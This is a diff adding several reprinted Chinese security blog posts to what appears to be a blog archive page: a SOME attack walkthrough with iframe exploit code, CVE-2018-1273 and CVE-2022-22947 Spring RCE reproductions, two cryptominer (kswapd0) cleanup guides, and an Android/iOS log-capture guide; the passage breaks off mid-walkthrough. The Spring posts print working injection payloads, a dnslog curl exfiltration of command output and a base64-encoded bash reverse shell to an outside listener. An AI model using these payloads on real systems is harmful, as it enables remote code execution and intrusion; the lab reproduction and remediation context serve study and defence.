@@ -86,6 +86,454 @@
 
     
         <h2 class="title">
+            <a href="/2023/10/25/SOME-Attack/">
+                浅析同源方式执行（SOME）攻击
+            </a>
+        </h2>
+    
+    <time>
+        Oct 25, 2023
+    </time>
+    <section class="content">
+        <h1><span id="浅析同源方式执行some攻击">浅析同源方式执行（SOME）攻击</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/169873.html">Str3am</a> 并作补充</p>
+</blockquote>
+<blockquote>
+<p>SOME（Same Origin Method Execution），同源方式执行，不同于 XSS 盗取用户 cookie 为目的，直接劫持 cookie 经行操作，和 CSRF 攻击很类似，不同的是 CSRF 是构造一个请求，而 SOME 则希望脚本代码被执行。  非常感谢兔子师傅@Homaebic在分享会上的分享，才有了这篇文章。</p>
+</blockquote>
+<h2><span id="0x01-原理及危害">0x01 原理及危害</span></h2><blockquote>
+<p>想要理解SOME攻击，必须先对同源策略和JSONP技术有所了解，JSONP我理解为一种用户可控制js执行函数的跨域数据访问技术，详细可以参见这篇文章或者百度。<br><a target="_blank" rel="noopener" href="http://blog.safedog.cn/?p=13">SOME攻击</a><br>正是由于JSONP可以控制执行函数的特性，产生了SOME攻击，主要危害比如点击链接后自动关注微博，自动点赞，自动授权等。</p>
+</blockquote>
+<h2><span id="0x02-攻击条件">0x02 攻击条件</span></h2><blockquote>
+<p>存在用户可控函数点，读取用户输入执行对应javascript代码（即寻找JSONP点，通常以get方法callback名传入）<br>可控点可以输入”.”，点号（因为SOME攻击主要还是操作网页DOM）</p>
+</blockquote>
+<h2><span id="0x03-some复现">0x03 SOME复现</span></h2><blockquote>
+<p>这里通过一个大佬写的SOME靶场来练习复现，除了靶场，还有查找dom工具，exp生成，SOME原理介绍，很不错的一个学习网站。<br><img src="/2023/10/25/SOME-Attack/1.png" alt="image"> </p>
+<p><a target="_blank" rel="noopener" href="https://www.someattack.com/Playground/About">Same Origin Method Execution</a><br>点击第一个 Vulnerable Example 项目，并打开一个子网页，在颜色轮盘上选择任意颜色，发现父网页标签背景会根据选择改变。<br><img src="/2023/10/25/SOME-Attack/2.png" alt="image"> </p>
+<p>子网页其实就是一个JSONP可控点，当我们点击轮盘中的任意颜色后它的连接如下：<br><a target="_blank" rel="noopener" href="https://www.someattack.com/Playground/ColorPicker.php?callback=changeColor">https://www.someattack.com/Playground/ColorPicker.php?callback=changeColor</a><br>现在我们想要做的就是控制callback参数，访问之后自动点击父页面的红色按钮。<br>利用第二个 Reference Generator 项目介绍的谷歌插件，这是一个可以自动获取元素DOM位置的插件。<br><img src="/2023/10/25/SOME-Attack/3.png" alt="image"></p>
+<p>右键即可获取，可在控制台中用click事件测试是否获取正确。<br><img src="/2023/10/25/SOME-Attack/4.png" alt="image"></p>
+<p>修改子页面参数如下：<br><code>https://www.someattack.com/Playground/ColorPicker.php?callback=box.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.click</code></p>
+<p>访问之后弹窗，按钮被点击，SOME攻击实现。<br><img src="/2023/10/25/SOME-Attack/5.png" alt="image"></p>
+<p>兔子师傅演示的时候打开了两个网页some1和some2，打开some1后，用windiow。open方式打开some2页面，等some1页面加载完之后，some2地址location.replace到payload实现攻击。<br>我在实际测试的时候发现，当我打开第一个页面，然后直接开启一个新的页面访问payload，第一个页面是不会弹窗的，但是两个页面都是满足同源策略的，按理说执行脚本代码是没问题的，参阅文章后发现，要实现DOM操作，两个界面还必须满足父窗口和子窗口关系，这样子窗口才能够操作到父窗口的DOM，否则执行操作的时候会提示元素找不到的错误。兔子师傅这里是在some1下用window.open打开的some2界面，两个窗口父子关系是满足的。<br>同时，还需要注意一点的是，因为很多浏览器禁止window.open的原因（谷歌和火狐会禁止），兔子师傅的方法局限性很大，柠檬师傅采用了两个iframe的办法，避免了拦截，也很好的保证了同源性。附上柠檬师傅的代码</p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">&quot;https://www.someattack.com/Playground/&quot;</span> name=b&gt;&lt;/iframe&gt;</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">a</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="variable language_">window</span>.<span class="property">frames</span>[<span class="number">0</span>].<span class="title function_">open</span>(<span class="string">&#x27;https://www.someattack.com/Playground/&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="built_in">setTimeout</span>(</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">window</span>.<span class="property">frames</span>[<span class="number">1</span>].<span class="property">location</span>.<span class="property">href</span> = <span class="string">&#x27;https://www.someattack.com/Playground/ColorPicker.php?callback=document.body.firstElementChild.lastElementChild.lastElementChild.lastElementChild.previousSibling.previousSibling.lastElementChild.click&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        ,<span class="number">1000</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<h2><span id="0x04-漏洞防御">0x04 漏洞防御</span></h2><blockquote>
+<p>回调函数使用静态函数命名，限制该函数的调用范围。<br>谷歌的解决方法是，把回调函数加入服务器端的白名单。<br>Hayak建议，注册回调函数。</p>
+</blockquote>
+<h2><span id="参考链接">参考链接</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.someattack.com/Playground/">https://www.someattack.com/Playground/</a><br><a target="_blank" rel="noopener" href="http://blog.safedog.cn/?p=13">http://blog.safedog.cn/?p=13</a><br><a target="_blank" rel="noopener" href="http://www.aqniu.com/hack-geek/5075.html">http://www.aqniu.com/hack-geek/5075.html</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SOME/" rel="tag">SOME</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/10/25/CVE-2018-1273-Spring-Data/">
+                Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）漏洞验证与getshell
+            </a>
+        </h2>
+    
+    <time>
+        Oct 25, 2023
+    </time>
+    <section class="content">
+        <h1><span id="spring-data-commons-远程命令执行漏洞cve-2018-1273漏洞验证与getshell">Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）漏洞验证与getshell</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45300786/article/details/119323425">樱浅沐冰</a> 并作补充</p>
+</blockquote>
+<h2><span id="影响版本">影响版本</span></h2><blockquote>
+<p>Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10)<br>Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)<br>Spring Data Commons 2.0 to 2.0.5 (Kay SR5)<br>Spring Data REST 3.0 - 3.0.5 (Kay SR5)</p>
+</blockquote>
+<h2><span id="复现过程">复现过程</span></h2><blockquote>
+<p>vulhub<br>详细过程请看<a target="_blank" rel="noopener" href="https://blog.csdn.net/zy15667076526/article/details/111413971?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162786362316780269821706%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=162786362316780269821706&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-111413971.pc_v2_rank_blog_default&utm_term=CVE-2018-1273&spm=1018.2226.3001.4450">Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）</a></p>
+</blockquote>
+<h3><span id="一-验证">一、验证</span></h3><blockquote>
+<p>这里使用dnslog来验证。<br>先获取一个dns地址<br>t15gcx.dnslog.cn<br><img src="/2023/10/25/CVE-2018-1273-Spring-Data/1.png" alt="image"> </p>
+<p>拼接命令<br><code>curl </code>whoami<code>.t15gcx.dnslog.cn</code></p>
+</blockquote>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">base64编码</a><br>对反弹shell的POC进行base64编码（java反弹shell都需要先编码，不然不会成功，原因貌似是runtime不支持管道符）<br><img src="/2023/10/25/CVE-2018-1273-Spring-Data/2.png" alt="image"> </p>
+<p><code>bash -c &#123;echo,Y3VybCBgd2hvYW1pYC50MTVnY3guZG5zbG9nLmNu&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p>
+</blockquote>
+<h3><span id="exp">Exp</span></h3><blockquote>
+<p>替换对应的payload，重新发送数据包<br>成功反弹回显到dnslog上<br><code>username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;bash -c &#123;echo,Y3VybCBgd2hvYW1pYC50MTVnY3guZG5zbG9nLmNu&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)]=&amp;password=&amp;repeatedPassword=</code></p>
+<p><img src="/2023/10/25/CVE-2018-1273-Spring-Data/3.png" alt="image"> </p>
+</blockquote>
+<h3><span id="二-反弹shell">二、反弹shell</span></h3><blockquote>
+<p>反弹shell<br><code>bash -i &gt;&amp; /dev/tcp/192.168.100.23/9090 0&gt;&amp;1</code></p>
+</blockquote>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">base64编码</a><br>对反弹shell的POC进行base64编码（java反弹shell都需要先编码，不然不会成功，原因貌似是runtime不支持管道符）<br><code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4yMy85MDkwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code><br>监听9090端口<br><img src="/2023/10/25/CVE-2018-1273-Spring-Data/4.png" alt="image"> </p>
+</blockquote>
+<blockquote>
+<p>替换掉curlwhoami.t15gcx.dnslog.cn对应的payload，重新发送数据包<br>成功反弹shell<br><img src="/2023/10/25/CVE-2018-1273-Spring-Data/5.png" alt="image"> </p>
+</blockquote>
+<h2><span id="参考文章">参考文章</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zy15667076526/article/details/111413971?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162786362316780269821706%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=162786362316780269821706&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-111413971.pc_v2_rank_blog_default&utm_term=CVE-2018-1273&spm=1018.2226.3001.4450">Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）</a><br><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/spring/CVE-2018-1273">Vulhub CVE-2018-1273</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Spring/" rel="tag">Spring</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/10/25/kswapd0-CPU-1/">
+                服务器（Linux）挖矿木马病毒（kswapd0进程使cpu爆满）
+            </a>
+        </h2>
+    
+    <time>
+        Oct 25, 2023
+    </time>
+    <section class="content">
+        <h1><span id="服务器linux挖矿木马病毒kswapd0进程使cpu爆满">服务器（Linux）挖矿木马病毒（kswapd0进程使cpu爆满）</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_47831505/article/details/123939089">飞川撸码</a> 并作补充</p>
+</blockquote>
+<h2><span id="前言">前言</span></h2><blockquote>
+<p>由于本人的阿里云服务器遭受攻击，被挖矿，导致CPU爆满，同时受到阿里云官方的邮箱、短信以及电话通知（监管部门是不允许服务器被直接或者间接挖矿）<br>首先是CPU爆满，远程登录不了，通过将服务器重启以后可以远程登录了。以kswapd0进程为例，其他进程类似，下面就是具体步骤了。<br>可参考阿里云的：挖矿程序处理最佳实践<br>注：如果你的服务器购买了付费版云安全中心，在云安全中心插件正常的前提下，可以利用付费版的主动防御及安全告警处理的功能来手动扫描下，对于检测到的威胁，你可以在安全告警处理页面进一步核实处理。应该可以直接处理掉。(如果没有，看下面的处理)<br><img src="/2023/10/25/kswapd0-CPU-1/1.png" alt="image"> </p>
+<p><img src="/2023/10/25/kswapd0-CPU-1/2.png" alt="image"> </p>
+</blockquote>
+<h2><span id="1在系统里面top一下查看了所有进程">1.在系统里面top一下，查看了所有进程</span></h2><blockquote>
+<p><img src="/2023/10/25/kswapd0-CPU-1/3.png" alt="image"> </p>
+<p>看到这些进程一直在变化，但是，主要是由于kswapd0进程在作怪，占据了99%以上的CUP，查找资料后，发现它就是挖矿进程。</p>
+</blockquote>
+<h2><span id="2排查kswapd0进程">2.排查kswapd0进程</span></h2><h3><span id="21-执行命令netstat-antlp-grep-kswapd0-查询该进程的网络信息">2.1 执行命令netstat -antlp | grep kswapd0 查询该进程的网络信息</span></h3><blockquote>
+<p><code>netstat -antlp | grep kswapd0</code><br><img src="/2023/10/25/kswapd0-CPU-1/4.png" alt="image"> </p>
+</blockquote>
+<blockquote>
+<p>发现一个与本机端口通信的是一个荷兰的ip<br><img src="/2023/10/25/kswapd0-CPU-1/5.png" alt="image"> </p>
+</blockquote>
+<h3><span id="22执行命令netstat-antlp-grep-1943619030-查询该地区ip的其他网络占用情况">2.2执行命令netstat -antlp | grep 194.36.190.30 查询该地区ip的其他网络占用情况</span></h3><blockquote>
+<p><code>netstat -antlp | grep 194.36.190.30</code><br><img src="/2023/10/25/kswapd0-CPU-1/6.png" alt="image"> </p>
+<p>发现只有这一个进程（当然，很有可能花卉有其他进程）</p>
+</blockquote>
+<h2><span id="3-查找进程的详细信息">3. 查找进程的详细信息</span></h2><blockquote>
+<p>我们来到&#x2F;proc&#x2F;目录下查找对应的pid号，即&#x2F;proc&#x2F;497。可以在这目录下找到kswapd0进程的详细信息。<br><code>ll /proc/497</code><br><img src="/2023/10/25/kswapd0-CPU-1/7.png" alt="image"> </p>
+</blockquote>
+<h2><span id="4查看进程的工作空间">4.查看进程的工作空间</span></h2><blockquote>
+<p><code>ps -ef | grep kswapd0</code><br><img src="/2023/10/25/kswapd0-CPU-1/8.png" alt="image"> </p>
+<p>执行完后可以看到进程的pid以及进程相关文件的位置</p>
+</blockquote>
+<h2><span id="5切换到木马程序目录并删除">5.切换到木马程序目录并删除</span></h2><blockquote>
+<p><img src="/2023/10/25/kswapd0-CPU-1/9.png" alt="image"> </p>
+<p><code>rm -rf /var/tmp/.copydie</code></p>
+</blockquote>
+<h2><span id="6清理定时任务">6.清理定时任务</span></h2><blockquote>
+<p>很多病毒都是有会在定时任务里面，以至于很难清理清楚。（由于我的服务器买油开启定时任务服务，所以里面没有任务）</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看定时任务：</span><br><span class="line">crontab -l</span><br><span class="line">清理计划任务: </span><br><span class="line">crontab -e</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>清除后将定时任务里的相关文件都清理干净，若有其他用户，将其他用户的定时任务也清理。</p>
+</blockquote>
+<h2><span id="7杀掉kswapd0进程">7.杀掉kswapd0进程</span></h2><blockquote>
+<p>最好把木马程序和定时任务都清理完了再杀掉,要不然还会自动重启<br><code>kill -9 497</code> #kill -9 kswapd0进程的PID</p>
+</blockquote>
+<h2><span id="8总结">8.总结</span></h2><blockquote>
+<p>就是跟着进程找找目录，然后杀进程，清目录<br>清定时任务<br>服务器的ftp端口最好别用22,密码尽量设置复杂点<br>尽量用密钥连接服务器，最好别用账号密码连接<br>封闭不使用的端口，做到用一个开一个（通过防火墙和安全组策略）<br>密码增强复杂性<br>及时修补系统和软件漏洞</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/kswapd0/" rel="tag">kswapd0</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/10/25/kswapd0-CPU-0/">
+                解决kswapd0 CPU占用率高的问题
+            </a>
+        </h2>
+    
+    <time>
+        Oct 25, 2023
+    </time>
+    <section class="content">
+        <h1><span id="解决kswapd0-cpu占用率高的问题">解决kswapd0 CPU占用率高的问题</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/Remberthename/article/details/106796887">年迈的老头子</a> 并作补充</p>
+</blockquote>
+<blockquote>
+<p>连接服务器时发现cpu使用率100%，使用top命令查看是kswapd0进程占用cpu极高<br><img src="/2023/10/25/kswapd0-CPU-0/1.png" alt="image"> </p>
+</blockquote>
+<blockquote>
+<p>百度下后知道kswapd0进程的作用：<br>它是虚拟内存管理中，负责换页的，操作系统每过一定时间就会唤醒kswapd ，看看内存是否紧张，如果不紧张，则睡眠，在 kswapd 中，有2个阀值，pages_hige 和 pages_low，当空闲内存页的数量低于 pages_low的时候，kswapd进程就会扫描内存并且每次释放出32 个free pages，直到 free page的数量到达pages_high。通过阻止kswapd0进程过渡活跃地消耗CPU的方法是设置大页内存。</p>
+</blockquote>
+<blockquote>
+<p>刚开始以为是本身服务器内存小的问题后来翻阅了其他大佬的博客后使用netstat -antlp查看了下系统外部连接，发现存在一个意大利的ip占用kswapd0进程和荷兰的ip占用rsync进程，，经查询后rsync是一个数据传输工具，此时意识到了事情的严重性<br><img src="/2023/10/25/kswapd0-CPU-0/2.png" alt="image"> </p>
+</blockquote>
+<blockquote>
+<p>此时开始查找进程占用的文件路径</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /proc/1266</span><br><span class="line"><span class="built_in">ls</span> -l exe</span><br><span class="line"><span class="built_in">cd</span> /proc/1246</span><br><span class="line"><span class="built_in">ls</span> -l exe</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><img src="/2023/10/25/kswapd0-CPU-0/3.png" alt="image"> </p>
+</blockquote>
+<blockquote>
+<p>查询过后发现是使用prel写的一个脚本，删除整个文件夹后发下这两个进程依然存在，然后就开始了简单粗暴的过程直接kill掉这两个进程，kill点之后发现这两个进程不在了cpu的使用率下来了观察一段时间后确定cpu使用率正常了<br><img src="/2023/10/25/kswapd0-CPU-0/4.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/kswapd0/" rel="tag">kswapd0</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/10/25/Catch-AppLog/">
+                app日志抓取
+            </a>
+        </h2>
+    
+    <time>
+        Oct 25, 2023
+    </time>
+    <section class="content">
+        <h1><span id="app日志抓取">app日志抓取</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42610167/article/details/104838634">测试之道.</a> 并作补充</p>
+</blockquote>
+<h2><span id="日志抓取">日志抓取</span></h2><blockquote>
+<p>1.首先通过adb devices查看设备是否连接成功<br>2.通过adb logcat命令抓取日志，保存到D盘下的1文件夹下面的log.txt文件中:<br><code>adb logcat -v time (-v time 为了获取日志时间)</code><br><img src="/2023/10/25/Catch-AppLog/1.png" alt="image"> </p>
+<p>3.将程序运行在前台，通过命令查看应用包名称：adb shell dumpsys | findstr “mFocusedActivity”<br><img src="/2023/10/25/Catch-AppLog/2.png" alt="image"> </p>
+<p>4.在导出的 log.txt 文件中搜索应用包名字，查看日志问题</p>
+</blockquote>
+<h3><span id="发生-crash-问题搜索关键字-force-finishing">发生 crash 问题，搜索关键字 force finishing</span></h3><blockquote>
+<p><img src="/2023/10/25/Catch-AppLog/3.png" alt="image"> </p>
+</blockquote>
+<h3><span id="发生-anr-问题">发生 anr 问题</span></h3><blockquote>
+<p>1.搜索关键字 anr in<br>2.treces.txt (adb shell–cd data – cd anr– traces.txt) （获取一次无响应）<br>3.dropbox.txt （adb shell – cd data – cd system – cd dropbox）（获取多次）</p>
+</blockquote>
+<h2><span id="一-mac-x2f-windows-电脑抓取android手机app-日志的方法">一、Mac &#x2F; Windows 电脑抓取Android手机APP 日志的方法</span></h2><h3><span id="电若脑只连接一个android设备">电若脑只连接一个Android设备</span></h3><blockquote>
+<p>1、电脑安装adb工具<br>2、手机打开usb调试：开发者选项开启–&gt;usb调试开启–&gt;允许usb调试<br>3、查询手机上第三方apk包的包名：<br>打开控制台：cmd<br>查询包名：adb shell pm list packages -3；（如：adb -s 11870469 shell pm list packages -3）<br>若琪app包名为 com.rokid.mobile<br>4、查询若琪app的进程号：adb shell ps | grep com.rokid.mobile （查出两个进程号）<br>5、电脑的当前路径创建文件存放日志：touch log<br>6、给文件操作权限：chmod 777 log<br>7、查询若琪APP的日志并导入到log文件：adb shell logcat |grep -e “进程号1” -e “进程号2” &gt;&gt; log<br>（如：adb -s 11870469 shell logcat |grep -e “6998” -e “7081” &gt;&gt; log ）</p>
+</blockquote>
+<h3><span id="电脑连接多个android设备">电脑连接多个Android设备：</span></h3><blockquote>
+<p>1、电脑安装adb工具<br>2、手机打开usb调试：开发者选项开启–&gt;usb调试开启<br>3、cmd 打开控制台<br>4、adb devices查询设备号<br>5、查询第三方apk包的包名：adb -s 设备号 shell pm list packages -3；（如：adb -s 11870469 shell pm list packages -3）<br>若琪app包名为com.rokid.mobile<br>6、查询第三方apk进程号：adb -s 设备号 shell ps | grep com.rokid.mobile<br>7、电脑的当前路径创建文件存放日志：touch log<br>8、给文件操作权限：chmod 777 log<br>9、查询若琪APP的日志并导入到log文件：adb -s 设备号 shell logcat |grep -e “进程号1” -e “进程号2” &gt;&gt; log<br>（如：adb -s 11870469 shell logcat |grep -e “6998” -e “7081” &gt;&gt; log ）</p>
+</blockquote>
+<h2><span id="二-mac电脑上抓取ios手机app日志的方法使用mac电脑自带的控制台">二、Mac电脑上抓取IOS手机APP日志的方法：使用Mac电脑自带的“控制台”</span></h2><blockquote>
+<p>Mac电脑对iOS手机的兼容性非常好，抓日志也很简单，ios手机连上电脑，打开控制台就开始抓取日志了，抓取的是全部的系统日志，用“RokidApp”过滤出若琪APP的日志<br><img src="/2023/10/25/Catch-AppLog/4.png" alt="image"> </p>
+<p><img src="/2023/10/25/Catch-AppLog/5.png" alt="image"> </p>
+</blockquote>
+<h2><span id="三-windows电脑上抓取ios-手机app日志的方法可以用itools工具">三、Windows电脑上抓取ios 手机APP日志的方法：可以用iTools工具</span></h2><blockquote>
+<p>1、下载安装itools工具：<a target="_blank" rel="noopener" href="http://www.mydown.com/soft/59/11963059.shtml">http://www.mydown.com/soft/59/11963059.shtml</a><br>2、插上ios手机之后要先安装驱动，驱动安装成功才能连上ios手机<br>3、如下图为连接手机成功<br><img src="/2023/10/25/Catch-AppLog/6.png" alt="image"> </p>
+<p>4、点击“工具箱”，点击“实时日志”，ios上所有APP的日志都能打印出来<br><img src="/2023/10/25/Catch-AppLog/7.png" alt="image"> </p>
+<p>5、保存系统日志,文件名为AppLog<br><img src="/2023/10/25/Catch-AppLog/8.png" alt="image"> </p>
+<p>6、cmd 打开控制台，过滤出若琪APP的日志并查看日志<br>cat AppLog | grep -e “RokidApp”<br>7、将若琪APP日志导出<br>创建文件：touch RokidAppLog<br>给文件赋权限：chmod 777 RokidAppLog<br>导出日志： cat AppLog | grep -e “RokidApp” &gt;&gt; RokidAppLog</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/AppLog/" rel="tag">AppLog</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/10/25/CVE-2022-22947-Spring-Cloud/">
+                Spring Cloud Gateway rce（CVE-2022-22947）
+            </a>
+        </h2>
+    
+    <time>
+        Oct 25, 2023
+    </time>
+    <section class="content">
+        <h1><span id="spring-cloud-gateway-rcecve-2022-22947">Spring Cloud Gateway rce（CVE-2022-22947）</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45794666/article/details/123338198">6right</a> 并作补充</p>
+</blockquote>
+<h2><span id="漏洞描述">漏洞描述</span></h2><blockquote>
+<p>Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令。<br>也是codeql发现的</p>
+</blockquote>
+<h2><span id="漏洞影响">漏洞影响</span></h2><blockquote>
+<p>3.1.0<br>3.0.0至3.0.6<br>3.0.0之前的版本</p>
+</blockquote>
+<h2><span id="复现漏洞">复现漏洞</span></h2><blockquote>
+<p>首先，发送以下请求以添加包含恶意SpEL 表达式的路由器：</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/gateway/routes/hacktest</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.159.132:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>333</span><br><span class="line"></span><br><span class="line"><span class="language-coffeescript">&#123;</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;id&quot;</span>: <span class="string">&quot;hacktest&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;filters&quot;</span>: [&#123;</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;AddResponseHeader&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;args&quot;</span>: &#123;</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Result&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;value&quot;</span>: <span class="string">&quot;<span class="subst">#&#123;<span class="keyword">new</span> <span class="built_in">String</span>(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(<span class="keyword">new</span> <span class="built_in">String</span>[]&#123;\<span class="string">&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;</span></span></span></span></span><br><span class="line"><span class="subst"><span class="string"><span class="language-coffeescript">    &#125;</span></span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">  &#125;],</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">  &quot;</span>uri<span class="string">&quot;: &quot;</span>http://example.com<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">&#125;</span></span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>反弹shell将命令替换为base64命令即可<br>Content-Type: application&#x2F;json</p>
+<p><img src="/2023/10/25/CVE-2022-22947-Spring-Cloud/1.png" alt="image"> </p>
+</blockquote>
+<blockquote>
+<p>其次，刷新网关路由器。SpEL 表达式将在此步骤中执行：</p>
+</blockquote>
